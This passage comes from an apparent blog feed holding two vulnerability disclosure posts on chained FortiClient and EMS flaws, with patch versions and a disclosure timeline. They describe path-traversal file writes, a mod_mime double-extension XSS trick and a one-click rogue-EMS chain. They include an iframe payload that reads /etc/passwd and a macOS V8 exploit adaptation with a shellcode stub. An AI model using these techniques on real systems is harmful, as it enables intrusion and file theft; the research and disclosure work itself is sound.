image.</p><p>The <code>DATA</code> message is built similarly to that of other client requests, but also consists of a <code>TYPE</code> header that is an enum referencing which kind of data is being sent.</p><p>We noticed that certain <code>DATA</code> uploads are saved into files under the <code>/opt/forticlientems/data/fctuploads/</code> directory (Linux-based EMS) with the following format:</p><ol><li>Type 1: <code>UID</code>_<code>HOSTNAME</code>_log.log</li><li>Type 2: <code>UID</code>_<code>HOSTNAME</code>_Diagnostic_Result.cab</li><li>Type 4: <code>UID</code>_<code>HOSTNAME</code>_log.gz</li><li>Type 5: ​​<code>UID</code>_<code>HOSTNAME</code>_Diagnostic_Result.gz</li><li>Type 8: <code>UID</code>_<code>HOSTNAME</code>_log.zip</li><li>Type 10: .&#x2F;snapshots&#x2F;<code>UID</code>.json</li><li>Unknown type: <code>UID</code>.<code>PROVIDED_TYPE</code>.<code>HASH</code>.upload</li></ol><p>Interestingly, the <code>UID</code> and <code>HOSTNAME</code> values are controlled by the client during the registration, and the <code>HASH</code>&#x2F;<code>PROVIDED_TYPE</code> values are defined in the <code>DATA</code> upload request. This makes each parameter used to construct the filename attacker-controlled. When creating the file, the EMS doesn’t normalize the user input, allowing path traversal sequences and therefore leading to a limited arbitrary file write vulnerability. However, exploiting this primitive isn’t straightforward, specifically because an attacker cannot control the extensions or suffixes of the filename. Essentially, it blocks attackers from elevating this primitive to execute arbitrary code on the server. To further evaluate what impact this vulnerability can have, we tried to identify other ways an attacker could use it.</p><p>Looking at the EMS features, there was one that seemed very interesting for an attacker:</p><img src="/img/blogs/fortinet/2/switch-ems.gif" style="width: 100%;"/><p>“Switch EMS” tells an endpoint to connect to a different EMS by IP. Meaning that if an attacker can leverage this limited file write to execute arbitrary JavaScript as an EMS administrator (XSS) then they can switch every endpoint in the organization to connect to a malicious EMS and subsequently exploit the vulnerability covered in the first blog post, which will potentially grant full code execution on every machine within the organization!</p><h2 id="From-Limited-File-Write-to-XSS-CVE-2025-22859"><a href="#From-Limited-File-Write-to-XSS-CVE-2025-22859" class="headerlink" title="From Limited File Write to XSS (CVE-2025-22859)"></a>From Limited File Write to XSS (CVE-2025-22859)</h2><p>The Linux version of EMS is running the web server using <a href="https://httpd.apache.org/" title="Apache httpd">Apache httpd</a> , which uses the <a href="https://httpd.apache.org/docs/2.4/mod/mod_mime.html" title="mod_mime">mod_mime</a> component to guess the content type of the file served by its extension and set the <code>Content-Type</code> header accordingly. We have already <a href="https://yaniv-git.github.io/2023/11/04/Apache%20httpd%20XSS%20by%20design/" title="covered">covered</a> a cool technique in the past that enables XSS when an attacker cannot control the extension, by using only dots or nothing as a filename. This happened because in those cases, <a href="https://httpd.apache.org/docs/2.4/mod/mod_mime.html" title="mod_mime">mod_mime</a> doesn’t add a <code>Content-Type</code> header, making the browser <a href="https://en.wikipedia.org/wiki/Content_sniffing" title="sniff">sniff</a> the type of the file according to the content, not the file extension.</p><p>However, this trick doesn’t work in the case of Fortinet EMS because the Apache httpd server is configured to serve the header “<code>x-content-type-options: nosniff</code>“, which tells the browser not to sniff the content type, and it will default to <code>text/plain</code>. But looking into the documentation of mod_mime, we stumble upon an interesting case:</p><img src="/img/blogs/fortinet/2/mod_mime_doc.png" style="width: 100%;"/><p>A file can have <a href="https://httpd.apache.org/docs/2.4/mod/mod_mime.html#multipleext" title="multiple extensions">multiple extensions</a>, with a priority given to the last one. For example, these file extensions will correspond to the following content-types:</p><table><thead><tr><th>File Extension</th><th>mod_mime Content-Type</th></tr></thead><tbody><tr><td>Filename.<strong>html</strong></td><td>text&#x2F;html</td></tr><tr><td>Filename.<strong>gif</strong></td><td>image&#x2F;gif</td></tr><tr><td>Filename.gif.<strong>html</strong></td><td>text&#x2F;html</td></tr><tr><td>Filename.<strong>unknown</strong></td><td></td></tr><tr><td>Filename.unknown.<strong>html</strong></td><td>text&#x2F;html</td></tr><tr><td>Filename.<strong>html</strong>.unknown</td><td>text&#x2F;html</td></tr></tbody></table><p>Using this knowledge, an attacker can choose a file type to upload that has an unknown extension (<code>.cab</code> or <code>.upload</code> in our case), traverse the upload destination to the static folder of the website, and simply add <code>.html</code> to the file name. The file will then be served as <code>text/html,</code> resulting in stored XSS.</p><img src="/img/blogs/fortinet/2/emx_xss.png" style="width: 100%;"/><h2 id="Second-Stage-Overview"><a href="#Second-Stage-Overview" class="headerlink" title="Second Stage Overview"></a>Second Stage Overview</h2><p>After the first stage, shown last week, the attacker has compromised a FortiClient endpoint and connected back to the an organization’s legitimate EMS. In the second part of the attack, a compromised client can upload a stored XSS payload to the EMS. When viewed by an administrator, arbitrary JavaScript is executed, forcing every FortiClient endpoint connected to this EMS to change the management server to an attacker-controlled one. From here, the attacker can exploit the vulnerability covered in the first part of the series again. This leads to the the worst case scenario of a fully compromised organization.<br><img src="/img/blogs/fortinet/2/stage2_recap.gif" style="width: 100%;"/></p><h1 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h1><p>While our research uncovered several FortiClient code execution vulnerabilities. We decided to focus on the simplest, ‘one-click outdated Electron’ method, due to its simplicity and minimal user interaction. All discovered methods ultimately lead to the same result.</p><p>The vulnerabilities we discovered are fixed in the following versions:</p><ul><li>CVE-2025-25251: fixed in FortiClientMac 7.4.3 and 7.2.9. Fix is also being backported to 7.0.</li><li>CVE-2025-31365: fixed in FortiClientMac 7.4.4 and 7.2.9</li><li>CVE-2025-22855: fixed in FortiClient EMS 7.4.3</li><li>CVE-2025-22859: fixed in FortiClient EMS 7.4.3; only EMS 7.4 (Linux-based) is affected by this issue. </li><li>CVE-2025-31366: fixed in FortiOS and FortiProxy versions 7.6.3 and 7.4.8</li></ul><p>We urge customers to update their affected Fortinet products to the fixed versions.</p><h1 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h1><table><thead><tr><th>Date</th><th>Action</th></tr></thead><tbody><tr><td>2024-11-20</td><td>We report all issues to Fortinet</td></tr><tr><td>2024-11-29</td><td>Fortinet acknowledges the receipt of the report</td></tr><tr><td>2024-12-18</td><td>Fortinet confirms the issues are being worked on</td></tr><tr><td>2025-01-28</td><td>CVE-2025-22855 and CVE-2025-22859 are assigned</td></tr><tr><td>2025-03-05</td><td>CVE-2025-25251 is assigned</td></tr><tr><td>2025-03-28</td><td>CVE-2025-31366 and CVE-2025-31365 are assigned</td></tr><tr><td>2025-04-08</td><td>CVE-2025-22855 is published</td></tr><tr><td>2025-04-08</td><td>Fortinet shares the CVSS scoring with us</td></tr><tr><td>2025-04-08</td><td>We request further clarification about the scoring</td></tr><tr><td>2025-04-10</td><td>Fortinet shares further CVSS details with us</td></tr><tr><td>2025-04-11</td><td>We provide our feedback regarding the CVSS scoring</td></tr><tr><td>2025-05-13</td><td>CVE-2025-22859 and CVE-2025-25251 are published</td></tr></tbody></table><h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>In this post, we have taken a deeper look into the inner workings of FortiClient and EMS, how they communicate, and what a malicious client could exploit. Using the vulnerability covered in this article, attackers who are authenticated to an EMS can traverse back the upload directory and create arbitrary files on the server with a limited name. We covered a technique attackers can use to overcome this limitation and achieve stored XSS in Apache httpd. </p><p>The impact of this vulnerability, when exploited, is the ability to force all the endpoints managed by the EMS to connect to a malicious EMS. This, combined with other vulnerabilities we uncovered, could potentially lead to remote code execution on every endpoint machine within an organization.</p><p>In the next blog post, we will go back to focusing on FortiClient and understand more details about its inner workings and what an attacker can exploit further.</p><p>We would like to thank the Fortinet PSIRT for their collaboration and responsiveness in addressing these findings.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Fortinet, a global leader in cybersecurity solutions, provides a wide array of products designed to safeguard organizations from increasi</summary>
      
    
    
    
    
    <category term="apache" scheme="https://yaniv-git.github.io/tags/apache/"/>
    
    <category term="xss" scheme="https://yaniv-git.github.io/tags/xss/"/>
    
    <category term="Fortinet" scheme="https://yaniv-git.github.io/tags/Fortinet/"/>
    
    <category term="chain" scheme="https://yaniv-git.github.io/tags/chain/"/>
    
    <category term="httpd" scheme="https://yaniv-git.github.io/tags/httpd/"/>
    
  </entry>
  
  <entry>
    <title>Caught in the FortiNet: How Attackers Can Exploit FortiClient to Compromise Organizations (1/3)</title>
    <link href="https://yaniv-git.github.io/2025/06/25/Caught%20in%20the%20FortiNet:%20How%20Attackers%20Can%20Exploit%20FortiClient%20to%20Compromise%20Organizations%201/"/>
    <id>https://yaniv-git.github.io/2025/06/25/Caught%20in%20the%20FortiNet:%20How%20Attackers%20Can%20Exploit%20FortiClient%20to%20Compromise%20Organizations%201/</id>
    <published>2025-06-25T22:00:00.000Z</published>
    <updated>2025-07-08T15:29:30.239Z</updated>
    
    <content type="html"><![CDATA[<p>Fortinet is one of the largest players in the cybersecurity industry, known for its extensive range of security solutions. Their portfolio includes firewalls, endpoint security, and intrusion detection systems, among others, designed to protect networks, applications, and data. These solutions are utilized across diverse sectors such as healthcare, finance, and government, helping organizations of various sizes defend against cyber threats.</p><p>To advance our understanding of cybersecurity threats and the security posture of leading software providers, we conducted in-depth research into the security of Fortinet’s FortiClient and FortiClient Endpoint Management Server (EMS). This research resulted in the discovery of multiple security vulnerabilities within Fortinet’s product suite. To share our findings with the community, we are publishing a 3-part blog series. This series will illustrate a realistic attack scenario targeting an organization utilizing Fortinet products, highlighting the potential impact of these vulnerabilities, particularly when chained together.</p><h1 id="Key-Information"><a href="#Key-Information" class="headerlink" title="Key Information"></a>Key Information</h1><ul><li>Sonar’s security researchers found severe vulnerabilities in Fortinet products that allow attackers to take over organizations with minimal user interaction.</li><li>The vulnerabilities affecting FortiClient, FortiClient Endpoint Management Server (EMS), FortiOS, and FortiProxy. </li><li>The vulnerabilities covered in this series have been fixed and are detailed in the Impact section.</li><li>According to Fortinet, they have not observed any exploitation of these vulnerabilities in the wild.</li><li>We believe the CVSS scores assigned by Fortinet do not fully reflect the potential severity of our findings, and we urge customers to treat these vulnerabilities with the highest priority and update to the fixed versions immediately.</li></ul><h1 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h1><p>Though each vulnerability’s impact differs, when chained together, they form a severe threat capable of granting an attacker complete organizational control with minimal user interaction. The vulnerabilities are tracked as:</p><ul><li>CVE-2025-25251: fixed in FortiClientMac 7.4.3 and 7.2.9. Fix is also being backported to 7.0</li><li>CVE-2025-31365: fixed in FortiClientMac 7.4.4 and 7.2.9</li><li>CVE-2025-22855: fixed in FortiClient EMS 7.4.3</li><li>CVE-2025-22859: fixed in FortiClient EMS 7.4.3; only EMS 7.4 (Linux-based) is affected by this issue</li><li>CVE-2025-31366: fixed in FortiOS and FortiProxy versions 7.6.3 and 7.4.8</li></ul><p>In this first part of our blog post series, we will focus solely on CVE-2025-22855, which allows an attacker to execute arbitrary code on a victim’s machine running FortiClient when a user opens a malicious link.</p><iframe width="736" height="414" src="https://www.youtube.com/embed/MqByEXOsEAQ" title="Caught in the FortiNet: How Attackers Can Exploit FortiClient to Compromise Organizations" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>While Fortinet offers a wide variety of products, our research was focused on two specific ones:</p><h2 id="FortiClient"><a href="#FortiClient" class="headerlink" title="FortiClient"></a>FortiClient</h2><p>Serves as an endpoint security solution that safeguards devices. It offers a multi-layered defense mechanism, including antivirus, vulnerability remediation, VPN, web filtering, and more. </p><img src="/img/blogs/fortinet/1/forticlient-window.png" style="width: 100%;"/><p>FortiClient’s UI is built on the <a href="https://www.electronjs.org/">Electron framework</a>, offering a cross-platform user interface. In this interface, users can perform various actions, such as connecting to a VPN and viewing scan results. While this architectural choice provides convenience and cross-platform compatibility, it also introduces potential vulnerabilities inherent to the framework and its underlying components, such as Chromium and Node.js.</p><h2 id="FortiClient-Endpoint-Management-Server-EMS"><a href="#FortiClient-Endpoint-Management-Server-EMS" class="headerlink" title="FortiClient Endpoint Management Server (EMS)"></a>FortiClient Endpoint Management Server (EMS)</h2><p>EMS can be hosted either by Fortinet (FortiClient Cloud) or on-premise. This server is responsible for managing and securing FortiClient endpoints. It’s where organizations’ administrators can perform actions such as changing endpoint configurations, viewing the states of the endpoints, and receiving an organizational overview via dashboards.<br><img src="/img/blogs/fortinet/1/ems-window.png" style="width: 100%;"/></p><h2 id="Organization-diagram"><a href="#Organization-diagram" class="headerlink" title="Organization diagram"></a>Organization diagram</h2><p>EMS and FortiClient are designed for integrated deployment. Typically, organizations have a single EMS instance responsible for managing multiple endpoints:</p><img src="/img/blogs/fortinet/1/org-overview.png" style="width: 100%;"/><p>For an attacker seeking to infiltrate an organization, targeting FortiClient endpoints offers several distinct advantages as a first point of entry. The greater number of FortiClient installations, one per endpoint, significantly expands the attack surface compared to one EMS. This further expands considering the variety in endpoint versions, OS, and potential patching inconsistency. </p><p>But most importantly, users often represent the weakest link in security. Since many attacks rely on some degree of user interaction, the abundance of users translates to a greater number of potential targets, increasing the attacker’s chances of successfully establishing an initial foothold within the organization.</p><h1 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h1><p>FortiClient and EMS communicate using a proprietary line-based protocol. We will discuss the details of the protocol in the next blog post, but for now, the crucial element to understand is the authentication process that occurs when a client connects to the EMS.</p><h2 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h2><p>There are 4 authentication methods an EMS can require: <code>None</code>, <code>LDAP</code>, <code>Local</code>, or <code>SAML</code>.  </p><ul><li><code>None</code>, does not require any authentication, and continues with the connection immediately.</li><li>In both <code>Local</code> and <code>LDAP</code> flow, Forticlient will prompt the user with a basic login window as such:</li></ul><img src="/img/blogs/fortinet/1/simple-login-window.png" style="width: 50%;"/>This will authenticate the user with the provided credentials.<ul><li><code>SAML</code>, opens the browser and goes through the organization’s <a href="https://en.wikipedia.org/wiki/Identity_provider" title="Identity Provider">Identity Provider</a> (IdP) authentication process. Upon successful authentication, the browser opens back FortiClient with an <code>auth_token</code>.</li></ul><p>But how can a browser go back to the FortiClient application? </p><h2 id="Electron’s-application-protocol-handler"><a href="#Electron’s-application-protocol-handler" class="headerlink" title="Electron’s application protocol handler"></a>Electron’s application protocol handler</h2><p>Electron offers developers a convenient way to <a href="https://www.electronjs.org/docs/latest/tutorial/launch-app-from-url-in-another-app" title="register a protocol">register a protocol</a> handler for specific URL schemes. This will tell the OS to redirect any URL with this scheme to the application. FortiClient registers the <code>fabricagent://</code> scheme, meaning when a user clicks on such a link, FortiClient’s Electron app will automatically launch and process that URL. This can be considered as an entry point for attackers as it requires just a simple click from a user to initiate a specific logic within an application.</p><h2 id="Forticlient’s-new-attack-surface-CVE-2025-22855"><a href="#Forticlient’s-new-attack-surface-CVE-2025-22855" class="headerlink" title="Forticlient’s new attack surface (CVE-2025-22855)"></a>Forticlient’s new attack surface (CVE-2025-22855)</h2><p>When researching the protocol handlers FortiClient offers, an interesting one caught our eye: the EMS invite link, which facilitates a convenient connection to a specified EMS through a simple link. </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">handlePossibleProtocolLauncherArgs</span>(<span class="params">argv</span>) &#123;</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (arg.<span class="title function_">includes</span>(<span class="string">&#x27;fabricagent://ems?inviteCode&#x27;</span>)) &#123; </span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">handleEMSInviteCodeScheme</span>(arg);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (arg.<span class="title function_">includes</span>(<span class="string">&#x27;fabricagent://vpn&#x27;</span>)) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">handleVPNUriScheme</span>(arg);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (arg.<span class="title function_">includes</span>(<span class="string">&#x27;fabricagent://ztna&#x27;</span>)) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">handleZtnaAuthentication</span>(arg);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (arg.<span class="title function_">includes</span>(<span class="string">&#x27;fabricagent://ems/onboarding&#x27;</span>)) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">handleEMSOnboardingResponse</span>(arg); </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (arg.<span class="title function_">includes</span>(<span class="string">&#x27;fabricagent://ems/msg&#x27;</span>)) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">handleEMSOnewayMsgScheme</span>(arg);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">handleCreateMainWindow</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>A significant security concern arose from the client’s behavior: When a user clicks on an invite link, FortiClient will try to connect to the EMS defined in the link, without any limitation or further interaction from the user. Additionally, <strong>disregarding any existing EMS connection. Even if the current EMS enforces <a href="https://community.fortinet.com/t5/FortiGate/Technicalt-Tip-Force-password-for-FortiClient-to-disconnect-from/ta-p/195457#:~:text=Go%20to%20Endpoint%20profiles%20%2D%3E%20Local,to%20disconnect%20FortiClient%20from%20EMS." title="password-protected disconnection">password-protected disconnection</a></strong> to prevent unauthorized removal (a security measure intended to protect the endpoint), FortiClient will still attempt to connect to the new EMS, essentially circumventing this safeguard.</p><img src="/img/blogs/fortinet/1/disconnect_pass.gif" style="width: 100%;"/><p>While connecting to an EMS via a link offers user convenience, it also presents an opportunity for attackers to lure users into connecting to malicious servers, opening up a whole new attack surface. </p><p>But what can a malicious EMS do? </p><h2 id="Malicious-EMS"><a href="#Malicious-EMS" class="headerlink" title="Malicious EMS"></a>Malicious EMS</h2><p>After a FortiClient connects to an EMS, the server gains access to various management capabilities, including log requests, certificate revocation, and more. While those intended capabilities could be attractive for attackers, they are limited. To execute arbitrary code and fully compromise the client machine, an attacker would need to exploit another vulnerability in the client.</p><p>Looking for weaknesses in the application, we were particularly interested in the “send message” feature. This feature allows admins to show custom messages to users.</p><img src="/img/blogs/fortinet/1/ems-actions.png" style="width: 100%;"/><p>A message can be either plaintext or in HTML format.</p><img src="/img/blogs/fortinet/1/message_feature.png" style="width: 100%;"/><p>Upon receiving a message, FortiClient creates a separate window from the main Electron one using the following <code>webPreferences</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">webPreferences</span>: &#123;</span><br><span class="line">  <span class="attr">webviewTag</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">contextIsolation</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">nodeIntegration</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">preload</span>: path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../../&#x27;</span>, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;main&#x27;</span>, <span class="string">&#x27;message-window&#x27;</span>, <span class="string">&#x27;preload.js&#x27;</span>),</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>These settings, particularly <code>contextIsolation</code> and disabled <code>nodeIntegration</code>, are intended to enhance security by isolating the window’s context. For plaintext messages, the content is directly injected as text using the <code>textContent</code> property, preventing any HTML rendering. However, HTML messages are saved locally, in the <code>file:///tmp/fct_endpoint_message.html</code> file, and rendered within a <a href="https://www.electronjs.org/docs/latest/api/webview-tag" title="webview">webview</a>.</p><img src="/img/blogs/fortinet/1/message-diagram.png" style="width: 100%;"/><p>A <code>webview</code> is similar to an iframe but rendered using a different process, meaning that there are no handles to the main window, nor any exported objects from <code>preload.js</code>. Despite it being an isolated environment for the main window, Fortinet introduced some critical vulnerabilities by deviating from <a href="https://www.electronjs.org/docs/latest/tutorial/security#15-do-not-use-shellopenexternal-with-untrusted-content" title="Electron&#39;s recommended security practices">Electron’s recommended security practices</a> (covered by Sonar in rule <a href="https://sonarsource.github.io/rspec/#/rspec/S7076" title="S7076">S7076</a>).</p><h2 id="The-file-protocol-scheme"><a href="#The-file-protocol-scheme" class="headerlink" title="The file:&#x2F;&#x2F; protocol scheme"></a>The file:&#x2F;&#x2F; protocol scheme</h2><p>Because the <code>webview</code> is being loaded under the <code>file://</code> <a href="https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols" title="protocol scheme">protocol scheme</a>, and according to the <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" title="Same-Origin Policy">Same-Origin Policy</a>, the HTML page <a href="https://url.spec.whatwg.org/#origin" title="might be able">might be able</a> to embed a different local file using the same scheme and read its content. Granting access to read and leak arbitrary files from the machine.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;file:///etc/passwd&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;console.log(document.getElementById(&#x27;file&#x27;).contentWindow.document.body.innerText)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>In addition to the <code>webview</code> being loaded under the <code>file://</code> protocol scheme, all other windows were using the same scheme.</p><img src="/img/blogs/fortinet/1/message-window-settings.png" style="width: 100%;"/><p>This means that there might be shared data between those windows! We found out that a parameter pointing to the previous EMS is stored in the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage" title="localStorage">localStorage</a> (a data storage per origin):</p><img src="/img/blogs/fortinet/1/localstorage.png" style="width: 100%;"/><p>An attacker can use this later in the attack to connect back to the legitimate organization’s EMS. Considering a scenario where the legitimate EMS is using SAML authentication and the victim is already logged in to the IdP on a normal day of work, the reconnection to the original EMS wouldn’t even require any additional interaction. </p><p>But beforehand, an attacker would need code execution on the victim machine. How can they do that?</p><h2 id="Arbitrary-code-execution-due-to-outdated-Electron"><a href="#Arbitrary-code-execution-due-to-outdated-Electron" class="headerlink" title="Arbitrary code execution due to outdated Electron"></a>Arbitrary code execution due to outdated Electron</h2><p>More critically than using the <code>file://</code> scheme, FortiClient was built using an outdated Electron version. By running <code>navigator.userAgent</code> in the dev tools console (FortiClient version 7.2.4.0850 on macOS), we noticed that the Electron version used was 11.1.1 and Chromium 87.0.4280.88. Which is before Electron had <a href="https://www.electronjs.org/docs/latest/tutorial/sandbox" title="process sandboxing by default">process sandboxing by default</a>, and is susceptible to many known vulnerabilities, such as CVE-2021-21224. While we developed a PoC for this specific version on macOS, FortiClient on other operating systems used other, but still outdated Electron builds (such as Chromium version 120.0.6099.56 on Linux FortiClient 7.4.0.1636).</p><h2 id="Adapting-CVE-2021-21224"><a href="#Adapting-CVE-2021-21224" class="headerlink" title="Adapting CVE-2021-21224"></a>Adapting CVE-2021-21224</h2><p>From here to execute code, an attacker would need to adapt an n-day vulnerability to the specific operating system and Chrome version. This was not straightforward as the original proof-of-concept (PoC) exploit we used as a reference was written for Linux, but our target was running on macOS. Since macOS employs additional mitigations, an attacker has to get around them as well.</p><p>To start, we looked through the <a href="https://github.com/anvbis/chrome_v8_ndays" title="chrome_v8_ndays">chrome_v8_ndays</a> repo for a suitable exploit that fits our Chrome version, 87.0.4280.88. We found <a href="https://www.cve.org/CVERecord?id=CVE-2021-21224" title="CVE-2021-21224">CVE-2021-21224</a> to be fitting, as it was marked as exploitable in versions &lt;90.0.4430.85, and the PoC did indeed crash our target. This CVE is a type confusion vulnerability caused by a <a href="https://v8.dev/docs/turbofan" title="TurboFan">TurboFan</a> speculative optimisation bug when it assumed that it was safe to convert signed 32-bit integers to unsigned 32-bit integers(missing a speculation guard). For more details, <a href="https://x.com/s1r1u5_" title="@S1r1u5_">@S1r1u5_</a> made a great <a href="https://s1r1us.ninja/posts/v8-rca/" title="root cause analysis">root cause analysis</a>.</p><p>We then set up a debugging environment to see where the exploit crashes instead of finishing properly. After adjusting some of the hardcoded offsets, we hit another roadblock. The original PoC used a <a href="https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-6/#overwriting-wasm-memory" title="WebAssembly object to allocate a page with RWX permissions">WebAssembly object to allocate a page with <code>RWX</code> permissions</a>, write shellcode to that page, and then execute it. However, when trying to write our shellcode, the process crashed. Even <code>vmmap</code> showed the page to have <code>RWX</code> permissions, so it should clearly be writable. What was happening?</p><p>It turns out that <a href="https://developer.apple.com/videos/play/wwdc2020/10686/?time=431" title="macOS comes with a security hardening against">macOS comes with a security hardening against</a> <code>RWX</code> pages. Such pages are dangerous because they allow attackers to write code to them and then cause it to be executed. To limit this, Apple introduced the <a href="https://en.wikipedia.org/wiki/W%5EX" title="write XOR execute">write XOR execute</a> (<code>*W^X*</code>) restriction, which adds additional permission bits to make a page either writable <em>or</em> executable, but never both at the same time. These bits are set per thread, so each thread can toggle its page access between writable and executable.</p><p>However JIT compilers frequently rely on memory being both writable and executable. To address that, Apple <a href="https://developer.apple.com/documentation/apple-silicon/porting-just-in-time-compilers-to-apple-silicon" title="added a new API">added a new API</a> (per thread) to toggle pages from executable to writable. To access this API the <a href="https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-jit" title="com.apple.security.cs.allow-jit">com.apple.security.cs.allow-jit</a> entitlement is needed to be set (which is the case in Electron as it is using a JIT compiler). </p><p>Since the page to overwrite was in the executable mode, the attacker has to find a way to flip the permission to writable first, then write the shellcode, flip the permission back, and execute it. We noticed that the WebAssembly technique gives the attacker a function-call primitive because the pointer to the <code>RWX</code> page inside the WebAssembly object can be overwritten to point to an arbitrary function. When calling a WebAssembly function from JavaScript, the engine will call this pointer, which is under the attacker’s control.</p><p>The attacker can use this to call the <a href="https://keith.github.io/xcode-man-pages/pthread_jit_write_protect_np.3.html#pthread_jit_write_protect_np" title="_pthread_jit_write_protect_np()">_pthread_jit_write_protect_np()</a> function that regular programs use to toggle a page’s mode. It receives a boolean argument that specifies if the page should be executable or not. We noticed that the first argument of a function call into WebAssembly is passed in the <code>x0</code> register, which is also where <code>_pthread_jit_write_protect_np</code> expects its boolean argument. This means that the attacker can toggle the <code>RWX</code> page’s mode at will.</p><p>With this new gadget, the attacker can now unprotect the page, write a shellcode to it, protect it again (making it executable), and finally execute it. For our purpose, we only wrote a small shellcode stub that allowed us to call arbitrary functions with more controlled arguments:</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">x4</span>, <span class="built_in">x0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">x0</span>, <span class="built_in">x2</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">x1</span>, <span class="built_in">x3</span></span><br><span class="line"><span class="keyword">br</span> <span class="built_in">x4</span></span><br></pre></td></tr></table></figure><p>With this, an attacker can call the <a href="https://man7.org/linux/man-pages/man3/dlopen.3.html" title="dlopen()">dlopen()</a> and <a href="https://man7.org/linux/man-pages/man3/dlsym.3.html" title="dlsym()">dlsym()</a> functions, which were already resolved in Chrome’s <a href="https://en.wikipedia.org/wiki/Global_Offset_Table" title="Global Offset Table">Global Offset Table</a> (GOT), to look up the address of the <a href="https://man7.org/linux/man-pages/man3/system.3.html" title="system()">system()</a> function, which was not yet resolved. Finally, the attacker can use <code>system()</code> to execute arbitrary OS commands, such as <code>open -a Calculator</code>.</p><h1 id="First-Stage-Overview"><a href="#First-Stage-Overview" class="headerlink" title="First Stage Overview"></a>First Stage Overview</h1><p>In this first stage of the attack covered in this blog post, we demonstrated how an attacker can force users to connect to a rogue EMS by a link, then by sending a message window that contains an HTML code with a v8 exploit, the attacker can fully compromise the machine. After the machine is compromised, the attacker can get a reference to the previously connected EMS and connect back to it, essentially acting now as a malicious client.<br><img src="/img/blogs/fortinet/1/first_stage_recap.gif" style="width: 100%;"/></p><h1 id="CVSS-Discrepancy"><a href="#CVSS-Discrepancy" class="headerlink" title="CVSS Discrepancy"></a>CVSS Discrepancy</h1><p>CVE-2025-22855, the vulnerability covered in this blog post, was rated as CVSS <code>AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:N</code> Low (2.6) by Fortinet based on the premise of a malicious administrator executing JavaScript. However, our research demonstrates a more significant risk: the capability for arbitrary code execution on the machine, and the fact that a user can be tricked into connecting to a malicious EMS with just one click.</p><p>This was not the only case where our impact assessment differed. We have shared these concerns with Fortinet, but it seems our feedback has not led to a revision of the CVSS scores. We urge customers to install a patched version immediately, even though the CVSS scores assigned by Fortinet might make it look less urgent.</p><h1 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h1><p>While our research uncovered several FortiClient code execution vulnerabilities. We decided to focus on the simplest, ‘one-click outdated Electron’ method, due to its simplicity and minimal user interaction. All discovered methods ultimately lead to the same result.</p><p>The vulnerabilities we 